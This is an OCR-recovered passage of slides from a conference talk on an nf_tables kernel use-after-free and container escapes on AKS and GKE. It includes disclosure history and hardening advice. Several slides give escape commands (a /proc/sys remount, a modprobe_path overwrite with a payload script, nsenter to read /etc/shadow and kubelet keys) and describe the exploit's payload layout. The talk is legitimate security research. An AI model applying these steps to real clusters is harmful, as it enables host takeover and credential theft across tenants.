> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WHY KUBERNETES IS DIFFERENT
Docker vs Kubernetes: Default Security
Docker (default) Kubernetes (default)
Custom profile Unconfined
syscall filter CLONE NEWUSER NO filtering. ALL syscalls pass.
AppArmor docker-default unconfined (AKS)
MAC profile restricts mount, pivot_root runtime/default (GKE) - neither blocks userns
unshare() EPERM SUCCESS
CLONE NEWUSER seccomp kills before kernel unshare -Urn works inside any pod
CVE-2026-23111 EXPLOITABLE
exploit result
SeccompDefault adoption (as of 2026):
AKS: _ opt-in "preview" feature. Estimated <5% adoption.
GKE: opt-in via --enable-default-seccomp. Disabled on Standard tier.
EKS: SeccompDefault feature gate disabled. No opt-in Ul.
Default = Unconfined = Exploitable
One missing seccomp profile turns LPE into cloud infrastructure compromise.
```

## Slide 48

##### **THE ATTACK MODEL**

Information Classification: General


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE ATTACK MODEL
Attack Model: What the Attacker Needs
Requirements:
apiVersion: vl
kind: Pod No privileged: true
metadata: No capabilities added
x
x
name: attacker-pod
spec: X No hostPID / hostNetwork
x
x
x
containers: No volume mounts
- name: shell
image: ubuntu:24.04 No service account tokens
command: No RBAC beyond pod creation
"sleep"
"infinity" , Only: schedule a pod.
Any image. Any namespace.
On a shared cluster: ANY tenant's pod can escape.
Lateral movement: pod — node = all pods on node -. cluster credentials.
```

## Slide 49

##### **CONTAINER ROOT vs REAL ROOT**

Information Classification: General


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CONTAINER ROOT vs REAL ROOT
Container Root vs Real Root: The uid_map Test
Exploit verification:
pod$ id fd = open(
uid=0(root) gid=0(root) "/proc/self/uid map"
pod$ cat /proc/self/uid map M
r) 0 1 ~ only 1 uid mapped read(fd, buf, sz);
if (strstr(buf,
"4294967295") )
pod$ mount -t proc proc /tmp/p
mount: permission denied namespace jail
else
commit_creds(fake_cred) boundary
AFTER commit_creds (user_ns = init_user_ns):
pod$ id
pod$ cat /proc/self/uid map
i) 6 4294967295 - FULL RANGE
pod$ mount -t proc proc /tmp/p
(success) — REAL root
Key: "4294967295" = 2432 - 1 = full UID range = init_user_ns = REAL root in the global namespace.
Without this check, the exploit would waste escape attempts on false positives.
```

## Slide 50

##### **THE ESCAPE: MOUNTING OVER /proc/sys**

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE ESCAPE: MOUNTING OVER /proc/sys
procfs Remount: Escaping the Read-Only Bind Mount
Container — can't write /proc/sys. After LPE — init_user_ns root can remount r/w
BEFORE: Container's /proci/sys is read-only Why it works:
pod$ mount | grep proc/sys
; The kernel check:
proc on /proc/sys type proc (ro,nosuid,nodev)
mount too revealing()
pod$ echo '/tmp/.x' > .../modprobe
. Returns true if caller
Read-only file system x
is NOT in init_user_ns
kubelet mounts /proc/sys as read-only to prevent container escape
Before exploit:
commit_creds(fake_cred) — user_ns = init_user_ns user_ns = container ns
~ too revealing = true
» mount BLOCKED
pod$ mount -o remount,rw /proc/sys After exploit:
user_ns = init_user_ns
pod$ echo '/tmp/.x' > .../modprobe + too revealing = false
— mount ALLOWED
Host kernel calls /tmp/.x on unknown binary format trigger ~~
procfs trusts init_user_ns fully
Key: commit_creds changes user_ns. This isn't just a UID change.
It unlocks mount operations the container was denied.
```

## Slide 51

##### **THE ESCAPE: OVERLAY + MODPROBE**

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE ESCAPE: OVERLAY + MODPROBE
Container Escape: Overlay + modprobe_path
Write to host filesystem via overlay upperdir, trigger kernel module load
Container View Host View
/proc/sys/kernel/ /proc/sys/kernel/
modprobe path Overlay modprobe path
(read-only bind mount in container) (writable for init_user_ns root)
After LPE (uid=0 in init_user_ns):
mount too revealing() PASSES "/tmp/.x" (our payload script)
Escape Flow (4 steps):
1. Remount /proc r/w Ginttsuserens) mount -o remount,rw /proc/sys
2. Write modprobe path = "/tmp/.x" echo ‘/tmp/.x' > modprobe_path
3. Write /tmp/.x via overlay upperdir script: cp /bin/sh /host_tmp/.sh
4. Trigger unknown binfmt HOST ROOT SHELL
= kernel calls /tmp/.x in INIT ns
Note: binfmt trigger removed in kernel 6.14 (commit faibdca98d74, Nov 2024). socket(AF_43) trigger unaffected. AKS/GKE ship 6.8.
```

## Slide 52

##### **REBOOT CYCLING**

Information Classification: General


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
REBOOT CYCLING
Cloud Reboot Cycling: Beating RANDOM_KMALLOC_CACHES
Problem: Sub-cache mapping fixed at boot may be unfavorable
16 sub-caches per slab. Same-callsite trick narrows the target, but ~1/16 chance per boot. Solution: reboot.
fast-cycle.sh — automated reboot loop Results:
AKS:
Escape on boot 3
reboot node() wait ready ~2min
seed cache() GKE:
Escape on boot 3
run exploit() G check uid map
Expected: 3-10 boots
~6-20 minutes total
In production: attacker doesn't need to trigger reboots.
Scheduled maintenance, auto-scaling, and node upgrades all reshuffle the mapping naturally.
Each new boot = fresh roll of the dice. Patience, not luck.
```

## Slide 53

##### **GKE: THE vec[0] CRASH AND FIX**

Information Classification: General


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GKE: THE vec[0] CRASH AND FIX
GKE Fix: vec[0] Self-Reference
The fake credential becomes its own AppArmor profile
GKE CRASH: NULL pointer dereference in fn_for_each_confined
Desktop: unconfined() skips vec[0]. GKE: AppArmor module hooks still walk vec[O] — NULL — panic.
248-byte payload (buf-relative): Self-reference chain:
A +0x28 cred start = aa_label start 1. Kernel reads label — vec[0]:
*(buf + 0x80) = &cred
+0x68 cap_effective = label — flags (UNCONFINED) points back to buf+0x28
+0x70 cap_bset upper 32b = label — size = 1 2. Kernel reads vec[0]— mode:
y _ *(buf+0x28 + 0x50) = *(buf+0x78)
TRIPLE-USE: is_last + profile . mode + cap_ambient
+0x80 jit_keyring = vec[0] ~ Profile skipped. No crash.
Before: 0 (NULL). Fix: &cred (self-ref = +0x28)
+0xA8 cred-— security = fake LSM blob — label Eourncimultaneousiconstrainte:
nft_rule_blob - cred - aa_label - aa_profile
What changed for GKE:
cap_ambient (buf+0x78): fake cred addr|1 -
jit_keyring (buf+0x80): © (NULL) =
Two fields changed. One allocation now satisfies four constraints.
The fake credential IS its own AppArmor profile.
USA
```

## Slide 54

##### **CONTAINERS ARE NOT A SECURITY BOUNDARY**

**Pod A          Pod B          Pod C** (attacker)      (secrets)      (database) |               |               | | namespace     | namespace     | namespace -----+---------------+---------------+-------- boundary |               |               | +---------------+---------------+ | v

+------------------+ |     KERNEL       |  <-- SHARED |                  |  <-- ONE BUG => ESCAPE |    nf_tables     | +------------------+

###### Actual isolation:

gVisor (user-space kernel)   -> no host nf_tables Kata Containers (microVM)    -> separate kernel per pod Firecracker (AWS Lambda)     -> hardware VMM boundary

Information Classification: General

## Slide 55

##### **THE COMPLETE CHAIN**

Information Classification: General


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE COMPLETE CHAIN
Complete Exploitation Chain
One inverted boolean to full container escape - five stages, zero race conditions
g Trigger Dt 3. Heap Spray + Reclaim
catchall genmask Leak 1: nft_last_ops spray PIN CHAIN COUNT = 200
inversion UAF Fill sub-cache slab page
COP_SPRAY = 1024 tables
Deterministic use drain ps Leak 2: module.list.prev »
chain freed, catchall live vmlinux base = prev-offset 248B triple-constraint payload
Bypasses: AppArmor (busybox) [ Bypasses: KASLR (both bases) | [ Bypasses: RANDOM_KMALLOC |
120B freed — kmalloc-cg-128 Same dangling ptr, 2 leaks blob + cred + aa_label in 248B
4. Call-Oriented Programming
TCP connect() triggers nft_do_chain
fake blob gen 0
nft_dynset_eval()
ops self-ref at +0xE8
ops->update = commit creds
Bypasses: RETHUNK (no ret gadgets)
pod . node -. cluster compromised
```

## Slide 56

##### **GKE: LET'S ASSEMBLE ALL PIECES TOGETHER**

###### **How the exploit works?**

**On GKE (6.8.0-1040-gke): Stage 1: Trigger UAF — drain victim3->use via DELSET abort Stage 2: Wait for RCU grace period + chain destruction Stage 2b: KASLR leak — vmlinux base via __this_module list.prev Stage 3: Second UAF — drain victim4->use via DELSET abort Stage 3b: Heap leak — spray msg_msg (1 per queue) Stage 4: Destroy msg queues, prepare COP spray Stage 4c: Add lookup rule to base_chain Stage 5: Trigger packet → fire COP chain → ROOT (uid=0) → nsenter host mount namespace**

- **→ CONTAINER ESCAPE**

**→ read host hostname, machine-id, /etc/shadow, kubelet PKI, GKE kube-env**

**Let’s demonstrate!**

Information Classification: General

## Slide 57

**GKE: DEMONSTRATION (6.8.0-1040-gke)**

Information Classification: General

## Slide 58

##### **AKS: LET'S ASSEMBLE ALL PIECES TOGETHER**

###### **How the exploit works?**

**AKS (6.8.0-1044-azure): Stage 1: Trigger UAF — drain victim3->use via DELSET abort Stage 2: Wait for RCU grace period + chain destruction Stage 2b: KASLR leak — vmlinux base via __this_module list.prev Stage 3: Second UAF — drain victim4->use via DELSET abort Stage 3b: Heap leak — spray msg_msg (1 per queue) Stage 4: Destroy msg queues, prepare COP spray Stage 4c: Add lookup rule to base_chain Stage 5: Trigger packet → fire COP chain → ROOT (uid=0) → nsenter host mount namespace**

- **→ CONTAINER ESCAPE**

**→ read host hostname, machine-id, /etc/shadow, kubelet PKI, azure.json**

**Let’s demonstrate!**

Information Classification: General

## Slide 59

**AKS: DEMONSTRATION (6.8.0-1044-azure)**

Information Classification: General

## Slide 60

###### **AGENDA**

Part I:  The Bug Root cause analysis of the inverted genmask check

Part II:  Exploitation From UAF to root on hardened Ubuntu 24.04 Part III:  Container Escape Escaping AKS and GKE managed Kubernetes

###### **►  Part IV:  Disclosure**

Three vendors, three reasons, same result

Closing:  Lessons Learned What the industry should fix

Information Classification: General

## Slide 61

##### **DISCLOSURE: SPOILER**

**Before we get into the disclosure timeline and rewards, a spoiler.**

**This bug was of the ”highest possible value”.**

**(I will tell you why at the end!)**

Information Classification: General

## Slide 62

##### **DISCLOSURE: ZDI**

###### **Case ###### — Kernel Exploit - LPE**

I first submitted to **ZDI** with the working exploit, source code, and evidence.

Focusing only on the LPE — then I worked on the container escape for **MSRC** and **Google VRP.** By the time they triaged it, the fix was upstream and the CVE was public.

**Rejected** .

**Status:  $0.**

Information Classification: General

## Slide 63

##### **DISCLOSURE: MICROSOFT (MSRC)**

**Case ###### — AKS Container Escape**

Feb 27:  Submitted. Working exploit + source + evidence. Container-to-host escape on AKS. Apr 03:  "Behavior confirmed."                    (35 days) Apr 14:  Bounty: $0. May 21:  "Fix coming June 9. You'll be credited in **CVE-2026-45652** ." Jul 02: **CVE REVOKED.** Severity downgraded: Important → Moderate. "Node-level compromise stays within the expected trust boundary." **Status:  $0.**

**Only “Critical and Important issues are eligible for CVE and bounties”**

Information Classification: General

## Slide 64

##### **DISCLOSURE: MICROSOFT (MSRC)**

**But thanks MSRC, for the “special” mention ;-)**

Information Classification: General


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DISCLOSURE: MICROSOFT (MSRC)
But thanks MSRC, for the “special” mention ;-)
© Special Mentions
Recognizing MSRC researchers who made a meaningful impact through the Microsoft Researcher
Recognition Program. Thank you for helping protect the Microsoft ecosystem.
Showing 1 researcher Tile ne Vv Tristan x
@ Updated monthly to reflect new recognitions.
Other
@TristanInSec
(0) Display name and recognition preferences can be managed through your researcher profile settings.
Information Classification: General 2026
```

## Slide 65

##### **DISCLOSURE: GOOGLE CLOUD VRP**

###### **GKE Container Escapes — Cloud VRP**

Mar 01:  Submitted this **(vuln A)** Container-to-host escape on GKE Standard. Working exploit + source + evidence.

Mar 05:  Submitted another **(vuln B)** Container-to-host escape on GKE Standard. Working exploit + source + evidence.

Mar 06: **(vuln B)** Won't Fix: "kernel vulns out-of-scope"

**"Linux kernel vulnerabilities are third-party software and not eligible for reward under the VRP rules."**

Mar 27: **(vuln A)** Response: Duplicate

**Status:  $0 for two independent container escapes.**

================================================================

Google runs GKE on Ubuntu nodes with the vulnerable kernel. A container escape on their platform is "third-party." Their own Kubernetes users bear the risk.

Information Classification: General

## Slide 66

###### **AGENDA**

Part I:  The Bug Root cause analysis of the inverted genmask check

Part II:  Exploitation From UAF to root on hardened Ubuntu 24.04

Part III:  Container Escape Escaping AKS and GKE managed Kubernetes

Part IV:  Disclosure Three vendors, three reasons, same result

**►  Closing:  Lessons Learned** What the industry should fix

Information Classification: General

## Slide 67

##### **THE ONE-LINE DIFF PROBLEM**

**-        if (!nft_set_elem_active(ext, genmask)) +        if (nft_set_elem_active(ext, genmask))** continue; This diff tells you: [+] The subsystem          (nf_tables -- reachable from userns) [+] The function           (nft_map_catchall_activate -- abort path) [+] The bug class          (inverted boolean -- refcount leak) [+] The exact exploitation path From this diff: Researcher -> working exploit: **Days** Distros    -> package update: **Months** Microsoft  -> Azure kernel update: **Months** Google     -> GKE kernel update: **Months**

Information Classification: General

## Slide 68

##### **WHAT TO DO MONDAY MORNING**

###### **1. ENABLE SeccompDefault ON YOUR KUBERNETES CLUSTERS**

AKS: {"seccompDefault": "RuntimeDefault"} in kubelet config GKE: --workload-vulnerability-scanning=standard EKS: kubelet --seccomp-default

Kills ALL userns-based exploits at step 1.

**2. BLOCK BUSYBOX UNCONFINED PROFILE (Ubuntu nodes)**

echo "kernel.apparmor_restrict_unprivileged_unconfined=1" \ >> /etc/sysctl.d/99-harden.conf && sysctl -p

**3. POD SECURITY STANDARDS: ENFORCE "RESTRICTED"**

kubectl label ns NAMESPACE \ pod-security.kubernetes.io/enforce=restricted

**4. MONITOR FOR THE FIX**

Ubuntu: ubuntu.com/security/CVE-2026-23111 AKS:   az aks nodepool show (check nodeImageVersion) GKE:   gcloud container clusters describe

Information Classification: General

## Slide 69

##### **STRUCTURAL LESSONS**

Information Classification: General


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
STRUCTURAL LESSONS
Structural Lessons: Bypass > Root Cause > Real Fix
What We Bypassed
RANDOM_KMALLOC_CACHES Per-CALLSITE, not per-allocation Per-ALLOCATION randomization
PIN_CHAIN_COUNT = 200 Same callsite = same sub-cache Every kmalloc() gets random
Same-callsite spray Mapping is deterministic sub-cache independently
> same sub-cache always 16 caches: not enough entropy Status: proposed, NOT merged
RETHUNK Only kills backward-edge (ret) Forward-edge CFI (IBT / CET)
COP: Call-Oriented Programming Forward-edge calls unaffected Intel CET: indirect call must
Forward-edge calls only ops~>func() is a legitimate land on ENDBR instruction
No ret gadgets needed kernel CALL instruction Status: NOT enabled Ubuntu GA
AppArmor userns Named unconfined = bypass restrict_unprivileged_unconfined
busybox unshare -Urn busybox-static always installed Sysctl blocks named unconfined
Named unconfined profile flags=(unconfined) from creating user namespaces
skips transition check Unconfined skips ns check Status: NOT enabled until 25.04
Every bypass exploits a design gap, not an implementation bug. The mitigations work as designed — the designs are insufficient.
```

## Slide 70

##### **FIVE TAKEAWAYS**

1.  One character can compromise millions of devices.

2.  Mitigations are speed bumps, not walls.

3.  Containers are not -- and never were -- a security boundary.

4.  Default configurations serve the attacker.

5.  The patch-to-deploy gap is the real vulnerability.

Information Classification: General

## Slide 71

##### **RESOURCES**

Information Classification: General


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RESOURCES
References & Prior Work
Foundations this
nf_tables / Netfilter Prior Vulnerabilities
CVE-2021-22555
Andy Nguyen (theflow@), Google Security Research
"Turning \x )0 into 1000 - Netfilter OOB t
CVE-2022-32250
nf_tables UAF via NFT.MSG_NEWSET — set expression use-after-free
CVE-2024-0193
nf_tables UAF via chain binding — cleanup path race
CVE-2024-1086
Notselwyn — "Flipping Pages: nf_tables double-free"
Dirty Pagedirectory techni , KernelCTF + Debian + Ubuntu
maintainer: Pablc
Prefetch Side-Channel Attacks
Gruss et al. — ACM CCS 2016
RANDOM_KMALLOC_CACHES (CONFIG_RANDOM_KMALLOC_CACHES)
GONG Ruiqi (Huawei) — Linux 6.6, 2023 — reviewed by Kees Cook
16 random sub-cach er slab feated by slab page pinning
SLUBStick: Cross-Cache Attacks in Linux Kernel
Maar et al. — USENIX Security 2024
research builds
JOP: Jump-Oriented Programming
Bletsch et al. — ASIACCS 2011
Foundation for forward-edge code reuse (COP builds
COOP: Counterfeit Object-Oriented Programming
Schuster et al. — IEEE S&P 2015
DirtyCred: Escalating Privilege in Linux Kernel
Zhenpeng Lin et al. — ACM CCS 2022
Credential swapping via UAF — alternative to our CO
ret2dir: Rethinking Kernel Isolation
Kemerlis et al. — USENIX Security 2014
physmap-be P bypass (contextualizes our approach)
A Compendium of Container Escapes
Edwards & Freeman — Black Hat USA 2019
Comprehensive taxonomy of container escape techniques
User Namespaces as Kernel Attack Surface
Jann Horn (Google Project Zero) — various advisories, 201
Pior Iserr ased kernel exploitation; KCTF «
Google kCTF / kernelCTF VRP
Google Security — security.googleblog.com
Bug bounty driving hardened kernel exploitation resee
Subsystem & Standards References
nf_tables nf_tables_api.c — Pablo Neira Ayuso (maintainer)
Kubernetes Pod Security Standards (PSS) — kubernetes.io
AKS / GKE Azure K8s Service & Google K8s Engine — targets
AppArmor Ubuntu userns restrictions — 23.10+
RETHUNK Peter Zijlstra — return thunk Spectre v2
SLAB/SLUB Lameter (original), Babka (maintainer)
```

## Slide 72

##### **FUTURE WORK & PUBLICATION**

###### **1.  Another Netfilter exploit!**

- -> nft_tunnel: fix use-after-free on object destroy

- -> **Discovery + Patch + CVE + LPE.** Full chain!

- -> CVE-2026-53212 assigned

**2.  Ubuntu AppArmor:** 11 CVEs

**3.  More Linux Kernel Vulnerabilities**

**4.  More Non-Linux Vulnerabilities**

- As you notice, I love Linux (and hacking it to secure it!) but I am not limited to this scope.

Many exciting research to come, announce, and publish. Let’s stay in touch!

Information Classification: General

## Slide 73

## **!secure**

###### **Let’s stay in Touch!**

- Future Research & Training: **TalenceSecurity.com**

# Thank you.

- X/Twitter: @TristanInSec

- LinkedIn: Tristan Madani

My Community Projects:

Tristan Madani Black Hat USA 2026

- Free CTF @ **HackForge.com**

- Free KB @ **HackWiki.com**
